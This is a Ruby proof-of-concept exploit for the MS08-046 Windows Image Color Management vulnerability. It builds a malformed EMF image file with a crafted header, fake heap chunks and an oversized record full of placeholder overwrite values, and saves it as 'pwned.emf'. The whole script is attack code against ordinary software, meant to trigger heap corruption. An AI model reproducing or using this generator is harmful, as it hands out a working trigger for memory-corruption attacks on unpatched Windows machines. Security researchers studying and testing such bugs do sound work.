#!/usr/bin/ruby
#
#
# References:
#   
#   http://source.winehq.org/source/dlls/mscms/profile.c
#   http://www.microsoft.com/technet/security/bulletin/ms08-046.mspx
#   http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=742
#

def create_emf_in_buf(nsize = 0)
  emr_header = [
    0x00000001,     # Type
    0x00000070,     # Record Size
    0x00000000,     # Bounds
    0x00000000,
    0x00000059,
    0x00000059,
    0x00000000,     # Frame
    0x00000000,
    0x00000C42,
    0x00000C31,
    0x464D4520,     # Signature
    0x00010000,     # Version
    nsize,          # Metafile Size - ??
    0x00000003,     # Record count in Metafile - ??
    0x0005,         # Max handles
    0x0000,         # Reserved
    0x00000004,     # Description byte size
    0x0000006C,     # Offset to description
    0x00000000,     # Pal Entries
    0x00000780,     # Size of Device in pixels
    0x00000780,
    0x000002A5,     # Size of Device in mm
    0x000001A7,
    0x00000000,     # Pixel Format Descriptor size
    0x00000000,     # Pixel Format Descriptor Object offset
    0x00000000,     # OpenGL usage
    0x000A55D5,     # MicroMeterX
    0x000675A5,     # MicroMeterY
    0x41414141      # Description
  ].pack('VVVVVVVVVVVVVVvvVVVVVVVVVVVVV')

  fake_chunk = "\x71\x00\x00\x00" +
               [64].pack('V') +
               "\x38\x00\x00\x00" +
               "\x01\x00\x00\x00" +
               "\x00\x03\x00\x00" +
               "\x41\x41\x41\x41" +
               "\x3a\x00\x61\x61" +
               "A" * (64 - 28)

  fake_chunks = fake_chunk * 5
  
   emr_payload =  "\x71\x00\x00\x00" +
                  "\x18\x03\x00\x00" +
                  "\x38\x00\x00\x00" +
                  "\x01\x00\x00\x00" +
                  "\x00\x03\x00\x00" +
                  "\x41\x41\x41\x41" +
                  "\x3a\x00\x61\x61" +
                  "\x61\x61\x61\x61" +
                  "\x61\x61\x61\x61" +
                  "\x61\x61\x61\x61" +
                  #"B" * 496 +
                  "B" * 172 +
                  # Chunk Start
                  "CCCC" + 
                  "DDDD" + 
                  "XXXX" + 
                  "YYYY" + 
                  "B" * 308 +
                  "\x61\x61\x00\x00" +
                  "\x0f\x01\x00\x00" +
                  "\x63\x63\x63\x63" +
                  "\x63\x63\x63\x63" +
                  "C" * 240
  emr_payload = fake_chunks + emr_payload

  emr_eof = [
    0x0000000E,     # Type
    0x00000014,     # Record Size
    0x00000000,     # Number of Palettes
    0x00000010,     # Offset to palette entries
    0x00000014,     # Last size
  ].pack('VVVVV')

  return (emr_header + emr_payload + emr_eof)
end

if __FILE__ == $0
  buf = create_emf_in_buf()
  buf = create_emf_in_buf(buf.size)

  File.open("pwned.emf", "w") do |f|
    f.write(buf)
    f.close
  end
end
